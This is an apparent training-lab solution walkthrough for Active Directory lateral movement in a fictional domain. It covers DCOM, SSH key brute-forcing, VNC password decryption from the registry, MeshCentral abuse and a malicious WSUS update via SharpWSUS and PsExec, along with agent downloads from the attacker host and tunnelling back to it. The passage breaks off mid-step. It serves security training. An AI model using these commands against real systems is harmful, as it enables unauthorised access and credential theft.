[03:02:01:141] [5510:5511] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.244:3389) 
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[03:02:01:143] [5510:5511] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.244:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open `PowerShell` and will download the `agent.exe` executable:

Code: powershell

```powershell
iwr -uri http://PWNIP:8000/agent.exe -o agent.exe
```

```
PS C:\Users\helen> iwr -uri http://10.10.15.174:8000/agent.exe -o agent.exe
```

Students will return to their workstations, they can terminate the Python HTTP server, and they will proceed to start `ligolo`'s proxy:

Code: shell

```shell
./proxy -selfcert
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ ./proxy -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: A910475F1FBB2F071C47BC3CCF0685188A816C82CB654A25505479E67071293B 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ \`/ __ \/ / __ \______/ __ \/ __ \`/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.6.2

ligolo-ng » 
```

Subsequently, students will return to the RDP session to establish the dynamic port-forwarding using the agent previously transferred:

Code: powershell

```powershell
.\agent.exe -connect PWNIP:11601 -ignore-cert
```

```
PS C:\Users\helen> .\agent.exe -connect 10.10.14.221:11601 -ignore-cert

time="2024-07-11T03:49:21-05:00" level=warning msg="warning, certificate validation disabled"
time="2024-07-11T03:49:21-05:00" level=info msg="Connection established" addr="10.10.14.221:11601"
```

Subsequently, students need to return to their workstations, open a new tab, and proceed to add a new network interface based on their usernames in the workstation (e.g. `htb-ac-XXXX`) and the subnet of the internal network. Additionally, students will query the `my_credentials.txt` file located on the Desktop to get t

Code: shell

```shell
cat Desktop/my_credentials.txt | grep Username
sudo ip tuntap add user <htb-ac-XXXX> mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.20.0.0/24 dev ligolo
```

```
┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ cat Desktop/my_credentials.txt | grep Username
Username: htb-ac-8414

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip tuntap add user htb-ac-8414 mode tun ligolo

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip link set ligolo up

┌─[eu-academy-5]─[10.10.14.221]─[htb-ac-8414@htb-d4d4brjin5]─[~]
└──╼ [★]$ sudo ip route add 172.20.0.0/24 dev ligolo
```

Students will return to `ligolo`'s proxy console, use the `session` command, select the agent, and initiate the tunnel (they need to press `Enter` after session):

Code: shell

```shell
session
start
```

```
INFO[6389] Agent joined.                                 name="INLANEFREIGHT\\helen@SRV01" remote="10.129.229.244:49730"
ligolo-ng » session 
? Specify a session : 2 - #2 - INLANEFREIGHT\helen@SRV01 - 10.129.229.244:49730

[Agent : INLANEFREIGHT\helen@SRV01] » start
INFO[6744] Starting tunnel to INLANEFREIGHT\helen@SRV0
```

After establishing the tunnel to the internal network, students will use `impacket-dcomexec` from Impacket to connect to `SRV02` (`172.20.0.52`) using Helen's credentials:

Code: shell

```shell
impacket-dcomexec -object MMC20 INLANEFREIGHT/Helen:'RedRiot88'@172.20.0.52
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-xqphib3snx]─[~]
└──╼ [★]$ impacket-dcomexec -object MMC20 INLANEFREIGHT/Helen:'RedRiot88'@172.20.0.52

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

Subsequently, students can grab the flag located in the `C:\Users\helen\Documents\` directory:

Code: shell

```shell
type C:\Users\helen\Documents\dcom.txt
```

```
C:\>type C:\Users\helen\Documents\dcom.txt
```

Answer: `New_ways_of_getting_access`

# Distributed Component Object Model (DCOM)

## Question 2

### "Use Josias's credentials with Impacket to connect to SRV02 and read the flag located at C:\\Users\\josias\\Documents\\dcom.txt"

Students will reuse the previously spawned target and the previously established tunnel to the internal network with Ligolo-ng. They will proceed to use `impacket-dcomexec` with the credentials `Josias:Jonny25`:

Code: shell

```shell
impacket-dcomexec -object MMC20 INLANEFREIGHT/Josias:'Jonny25'@172.20.0.52
```

```
┌─[eu-academy-5]─[10.10.14.228]─[htb-ac-8414@htb-xqphib3snx]─[~]
└──╼ [★]$ impacket-dcomexec -object MMC20 INLANEFREIGHT/Josias:'Jonny25'@172.20.0.52

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

With the established shell session, students can grab the flag located in the `C:\Users\josias\Documents` directory:

Code: shell

```shell
type C:\Users\josias\Documents\dcom.txt
```

```
C:\>type C:\Users\josias\Documents\dcom.txt
```

Answer: `Linux_DCOM_Access`

# Secure Shell (SSH)

## Question 1

### "Authenticate as ambioris and read the flag located at C:\\Users\\ambioris\\Desktop\\flag.txt"

After spawning the target, students will connect via SSH using the credentials `ambioris:Ward@do9049`:

Code: shell

```shell
ssh ambioris@SMTIP
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ ssh ambioris@10.129.229.244

The authenticity of host '10.129.229.244 (10.129.229.244)' can't be established.
ED25519 key fingerprint is SHA256:odELGTN83SCGohcLM65dx32PmqEU4lsKbMQ4XGxyOxg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.244' (ED25519) to the list of known hosts.
ambioris@10.129.229.244's password: 

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

inlanefreight\ambioris@SRV01 C:\Users\ambioris>
```

Students can proceed to grab the flag located in the `C:\Users\ambioris\Desktop` directory:

Code: shell

```shell
type C:\Users\ambioris\Desktop\flag.txt
```

```
inlanefreight\ambioris@SRV01 C:\Users\ambioris>type C:\Users\ambioris\Desktop\fl
ag.txt
```

Answer: `Simple_SSH_Authentication`

# Secure Shell (SSH)

## Question 2

### "Find a sshkey on C:\\Users\\ambioris directory. What's the filename:"

Within the previously established SSH session, students will proceed to query the contents of the `C:\Users\ambioris\.ssh` directory, where they will find the filename of the SSH key:

Code: shell

```shell
dir C:\Users\ambioris\.ssh
```

```
inlanefreight\ambioris@SRV01 C:\Users\ambioris>dir C:\Users\ambioris\.ssh 
 Volume in drive C has no label.
 Volume Serial Number is D756-262A

 Directory of C:\Users\ambioris\.ssh

06/26/2024  03:26 PM    <DIR>          .
06/26/2024  03:26 PM    <DIR>          ..
06/26/2024  03:26 PM               196 known_hosts
```

Answer: `unknown_id_rsa`

# Secure Shell (SSH)

## Question 3

### "Which port is SRV02 using for SSH?"

Students will reuse the previously established SSH session and will enumerate the ports of `SRV02` (`172.20.0.52`) using `PowerShell`. They will spawn `PowerShell` and use a one-liner to find the port for SSH on `SRV02` through the range `2200-2300`. After a few seconds, students will attain the open port on `SRV02` in the specified range:

Code: shell

```shell
powershell
2200..2300 | % {echo ((new-object Net.Sockets.TcpClient).Connect("172.20.0.52",$_)) "Port $_ is open!"} 2>$null
```

```
inlanefreight\ambioris@SRV01 C:\Users\ambioris>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\ambioris> 2200..2300 | % {echo ((new-object Net.Sockets.TcpClient).Connect("172.20.0.52",$_)) "Port $_ is open!"} 2>$null
```

Answer: `2299`

# Secure Shell (SSH)

## Question 4

### "Authenticate to SRV02 using the SSH key you found. Which domain user can authenticate with the SSH Key you found on Ambioris's folder?"

Students will reuse the previously spawned target to obtain the SSH key located in the `C:\Users\ambioris\.ssh` directory using `SCP` using `ambioris`' credentials:

Code: shell

```shell
scp ambioris@STMIP:/Users/ambioris/.ssh/unknown_id_rsa .
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ scp ambioris@10.129.229.244:/Users/ambioris/.ssh/unknown_id_rsa .

ambioris@10.129.229.244's password: 
unknown_id_rsa                                                                                                                                              100% 1679    89.9KB/s   00:00 
```

Students will establish a dynamic port-forwarding through SSH and spawn \`PowerShell:

Code: shell

```shell
ssh -D 9050 ambioris@STMIP
powershell
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ ssh -D 9050 ambioris@10.129.229.244
ambioris@10.129.229.244's password:

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

inlanefreight\ambioris@SRV01 C:\Users\ambioris>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\ambioris> 
```

Subsequently, students will proceed to gather potential usernames using `Get-ADUser` while creating a list that will be used further to brute-force the user who:

Code: shell

```shell
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
```

```
PS C:\Users\ambioris> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName

Administrator 
Guest        
krbtgt       
Redpostmanrd 
Snowfreeze   
Lich
Crismerlin   
Helen
Tiltmanx
Maria
Jhomil
Thael
Leonvqz
Frewdy
Josias
Thesuperteacher
Ambioris
Filiplain
Xracer
```

Before engaging in brute-forcing the user that the key belongs to, students will change permissions of the `unknown_id_rsa` private key they previously downloaded:

Code: shell

```shell
chmod 600 unkown_id_rsa
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ chmod 600 unknown_id_rsa
```

Students will either test each user one by one or write a similar bash script to automate the user account tests:

Code: bash

```bash
while read -r user; do
		echo "Trying user: $user"
		proxychains ssh -o BatchMode=yes -o StrictHostKeyChecking=no -i unknown_id_rsa $user@172.20.0.52 -p 2299 "exit" 2>/dev/null
		if [ $? -eq 0 ]; then
				echo "Login successful for user: $user"
				break
		fi
done < users.txt
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ bash ssh-brute.sh 
Trying user: Administrator
<SNIP>
Trying user: {hidden}
Login successful for user: {hidden}
```

Answer: `Josias`

# Secure Shell (SSH)

## Question 5

### "Read the flag located at the .ssh directory of the user account you accessed using the key:"

Students will reuse the previously established chain of connections (dynamic port-forwarding) and proceed to authenticate to `SRV02` (`172.20.0.52`) using the found private key and user:

Code: shell

```shell
proxychains ssh -i unknown_id_rsa Josias@172.20.0.52 -p 2299
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-qopykegfvv]─[~]
└──╼ [★]$ proxychains ssh -i unknown_id_rsa Josias@172.20.0.52 -p 2299

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.20.0.52:2299  ...  OK

Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

inlanefreight\josias@SRV02 C:\Users\Josias>
```

With obtained SSH session, students will proceed to query the contents of the `C:\Users\Josias\.ssh` directory and query the flag located within it:

Code: shell

```shell
dir C:\Users\Josias\.ssh 
type C:\Users\Josias\.ssh\flag.txt
```

```
inlanefreight\josias@SRV02 C:\Users\Josias>dir C:\Users\Josias\.ssh 
 Volume in drive C has no label.
 Volume Serial Number is 513B-584F

 Directory of C:\Users\Josias\.ssh

06/26/2024  01:32 PM    <DIR>          .
06/26/2024  01:32 PM    <DIR>          ..
06/26/2024  11:55 AM               408 authorized_keys 
06/26/2024  01:26 PM                25 flag.txt

inlanefreight\josias@SRV02 C:\Users\Josias>type C:\Users\Josias\.ssh\flag.txt
```

Answer: `SSH_KEY_Authentication`

# Remote Management Tools

## Question 1

### "Decrypt the VNC credentials from SRV02. What's the VNC password?"

After spawning the target, students will use SSH to establish a dynamic port-forwarding using the credentials `helen:RedRiot88`:

Code: shell

```shell
ssh -D 9050 helen@STMIP
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-ise2nzsvgt]─[~]
└──╼ [★]$ ssh helen@10.129.72.91 -D 9050

helen@10.129.72.91's password:
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

inlanefreight\helen@SRV01 C:\Users\helen>
```

Subsequently, students will open a new terminal tab and will authenticate to `SRV02` (`172.20.0.52` through `Evil-WinRM` using Helen's credentials:

Code: shell

```shell
proxychains evil-winrm -i 172.20.0.52 -u helen -p RedRiot88
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-ise2nzsvgt]─[~]
└──╼ [★]$ proxychains evil-winrm -i 172.20.0.52 -u helen -p RedRiot88

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.20.0.52:5985  ...  OK
*Evil-WinRM* PS C:\Users\helen\Documents>
```

Students will query the registry key `HKLM\SOFTWARE\TightVNC\Server` to obtain the `Password` value:

Code: shell

```shell
reg query HKLM\SOFTWARE\TightVNC\Server /s
```

```
*Evil-WinRM* PS C:\Users\helen\Documents> reg query HKLM\SOFTWARE\TightVNC\Server /s

HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
    ExtraPorts    REG_SZ
    <SNIP>
    EnableUrlParams    REG_DWORD    0x1
    Password    REG_BINARY    816ECB5CE758EABD
```

Students will return to their workstations, open a new terminal tab, and proceed to decrypt the password value:

Code: shell

```shell
echo -n 816ECB5CE758EABD | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-ise2nzsvgt]─[~]
└──╼ [★]$ echo -n 816ECB5CE758EABD | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv

00000000  56 4e 43 50 61 73 73 31                           |{hidden}|
00000008
```

Answer: `VNCPass1`

# Remote Management Tools

## Question 2

### "Use VNC to connect to the DC01. What's the username of the account logged into the DC01 console?"

Students will reuse the previously spawned target and dynamic port-forwarding and connect to `DC01` (`172.20.0.10`) using `vncviewer` and submit the password `VNCPass1`:

Code: shell

```shell
proxychains vncviewer 172.20.0.10
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-ise2nzsvgt]─[~]
└──╼ [★]$ proxychains vncviewer 172.20.0.10

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16

TigerVNC Viewer 64-bit v1.12.0
Built on: 2023-01-06 16:01
Copyright (C) 1999-2021 TigerVNC Team and many others (see README.rst)
See https://www.tigervnc.org for information on TigerVNC.

Mon Jul 15 02:18:51 2024
 DecodeManager: Detected 4 CPU core(s)
 DecodeManager: Creating 4 decoder thread(s)
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.20.0.10:5900  ...  OK
 CConn:       Connected to host 172.20.0.10 port 5900
 CConnection: Server supports RFB protocol version 3.8
 CConnection: Using RFB protocol version 3.8
 CConnection: Choosing security type VncAuth(2)

Mon Jul 15 02:18:54 2024
 CConn:       Using pixel format depth 24 (32bpp) little-endian rgb888
```

Subsequently, students will open `PowerShell` and execute `whoami` to get the username they authenticated as:

Code: powershell

```powershell
whoami
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\filiplain> whoami

inlanefreight\filiplain
```

Answer: `filiplain`

# Remote Management Tools

## Question 3

### "Use VNC to connect to the DC01 and read the flag.txt located in the desktop."

Using the previously spawned target and VNC session, students will reuse `PowerShell` to query the contents of `flag.txt` located in the `C:\Users\filiplain\Desktop` directory:

Code: powershell

```powershell
type C:\Users\filiplain\Desktop\flag.txt
```

```
PS C:\Users\filiplain> type C:\Users\filiplain\Desktop\flag.txt
```

Answer: `VNC_Connection_Is_FUN`

# Software Deployment and Remote Management Tools

## Question 1

### "Connect to MeshCentral (https://172.20.0.25). What's the device group name where DC01 belongs to?"

After spawning the target, students will proceed to establish an RDP session using the credentials `helen:RedRiot88`:

Code: shell

```shell
xfreerdp /v:STMIP /u:helen /p:RedRiot88 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-amapex0cfr]─[~]
└──╼ [★]$ xfreerdp /v:10.129.85.34 /u:helen /p:RedRiot88 /dynamic-resolution

[02:48:15:778] [12136:12137] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[02:48:15:778] [12136:12137] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[02:48:15:778] [12136:12137] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[02:48:15:830] [12136:12137] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[02:48:15:830] [12136:12137] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.85.34:3389) 
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - Common Name (CN):
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[02:48:15:831] [12136:12137] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.85.34:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will open `Firefox` and navigate to `http://172.20.0.25` while ignoring the certificate issue:

![[HTB Solutions/CAPE/z. images/c88598ec437611c6d8eec969ff4d533f_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/620c996331b78e6136985caf69f96acd_MD5.jpg]]

Subsequently, students will proceed to use the credentials `admin:RemoteManagement01` to log in to `MeshCentral`:

![[HTB Solutions/CAPE/z. images/ff9fabf1be41b012d6ab4ae297e127c8_MD5.jpg]]

Once they have logged in, students will presented with the `My Devices` landing page, where the machines (servers) are separated into different groups:

![[HTB Solutions/CAPE/z. images/67d5fd76f57000060d59e524f26e6b2f_MD5.jpg]]

Answer: `CoreServers`

# Software Deployment and Remote Management Tools

## Question 2

### "Use MeshCentral to compromise the Domain Controller. What's the content of the flag located at C:\\Users\\Administrator\\Desktop\\flag.txt:"

Students will reuse the previously established RDP session and authentication to `MeshCentral` to interact with `DC01`. They will start with selecting the agent:

![[HTB Solutions/CAPE/z. images/603215c5c6cdb2176f33bd5a511c2c32_MD5.jpg]]

Subsequently, students will select `Terminal`:

![[HTB Solutions/CAPE/z. images/94c7f23b70a34df890439fc438fba734_MD5.jpg]]

Click on the `Connect` button to start an interactive terminal session:

![[HTB Solutions/CAPE/z. images/17c4e1ec9f78e2823ff09ac39e21f408_MD5.jpg]]

Subsequently, students will proceed to grab the flag located in the `C:\Users\Administrator\Desktop` directory:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Mesh Agent>type C:\Users\Administrator\Desktop\flag.txt 
```

Answer: `Domain_Controller_Compromised_by_3rdPartySoftware`

# Windows Server Update Services (WSUS)

## Question 1

### "Compromise the DC01 using WSUS. Submit the flag located at C:\\WSUS\\flag.txt"

After spawning the target, students will proceed to establish an RDP session using the credentials `filiplain:Password1`:

Code: shell

```shell
xfreerdp /v:STMIP /u:filiplain /p:Password1 /dynamic-resolution
```

```
┌─[eu-academy-5]─[10.10.14.133]─[htb-ac-8414@htb-cut6od8d6a]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.244 /u:filiplain /p:Password1 /dynamic-resolution 

[03:25:13:594] [8371:8372] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[03:25:13:595] [8371:8372] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[03:25:13:595] [8371:8372] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[03:25:13:644] [8371:8372] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[03:25:13:644] [8371:8372] [WARN][com.freerdp.crypto] - CN = SRV01.inlanefreight.local
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.244:3389) 
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - Common Name (CN):
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - 	SRV01.inlanefreight.local
[03:25:13:645] [8371:8372] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.244:3389 (RDP-Server):
	Common Name: SRV01.inlanefreight.local
	Subject:     CN = SRV01.inlanefreight.local
	Issuer:      CN = SRV01.inlanefreight.local
	Thumbprint:  04:d5:23:5c:1a:e6:9d:81:eb:81:f1:ee:17:4f:e3:c0:be:1c:55:e4:dd:d1:f8:f3:2f:f6:8d:14:ed:c7:da:88
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students will proceed to establish another RDP session within current one using the credentials `filiplain:Password1` to `WSUS`:

![[HTB Solutions/CAPE/z. images/c1f1c0833878db3bb884f612a112871d_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/d48e9fff7d7375acb351180345052dd9_MD5.jpg]]

Students will open `PowerShell` as Administrator, navigate to `C:\Tools`, and use `SharpWSUS` to create a malicious update utilizing `PsExec` to add the user `filiplain` to the `Local Administrators` on `DC01`:

Code: powershell

```powershell
cd C:\Tools
.\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"AcademyStudents"
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> .\SharpWSUS.exe create /payload:"C:\Tools\sysinternals\PSExec64.exe" /args:"-accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add" /title:"AcademyStudents"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _\` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: PSExec64.exe
[*] Payload Path: C:\Tools\sysinternals\PSExec64.exe
[*] Arguments: -accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add
[*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c net localgroup Administrators filiplain /add

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
WSUS, 8530, C:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 101485
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 101486
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:84e3eb5f-5dca-4a8f-ace1-f28fad41905f /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:84e3eb5f-5dca-4a8f-ace1-f28fad41905f /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:84e3eb5f-5dca-4a8f-ace1-f28fad41905f /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```

Students will then utilize the `updateid` value from the previous command to approve the update on the `dc01.inlanefreight.local` machine:

Code: powershell

```powershell
.\SharpWSUS.exe approve /updateid:84e3eb5f-5dca-4a8f-ace1-f28fad41905f /computername:dc01.inlanefreight.local /groupname:"FastUpdates"
```

```
PS C:\Tools> .\SharpWSUS.exe approve /updateid:84e3eb5f-5dca-4a8f-ace1-f28fad41905f /computername:dc01.inlanefreight.local /groupname:"FastUpdates"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _\` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc01.inlanefreight.local
TargetComputer, ComputerID, TargetID
------------------------------------
dc01.inlanefreight.local, bbc6e1ed-75ec-4eea-81cf-05da5c18e93e, 3
Group Exists = False
Group Created: FastUpdates
Added Computer To Group
Approved Update

[*] Approve complete
```

Subsequently, students will open `Windows Server Update Services` and navigate to `Updates` > `All Updates`. Set the `Approval` to `Approved` to obtain information about the update's status. Due to unexpected behavior with SharpWSUS, students may encounter an error related to the failure to download the update.

![[HTB Solutions/CAPE/z. images/79e0a2109efb9b7dc188283ecaa0f7a5_MD5.jpg]]

Upon facing the above error, students will query the `Event Logs` and scrutinize events with id `364` using `Get-WinEvent` cmdlet related to an HTTP 404 status code (the requested resource was not found). They will note the unique name of the executable file and its location:

Code: powershell

```powershell
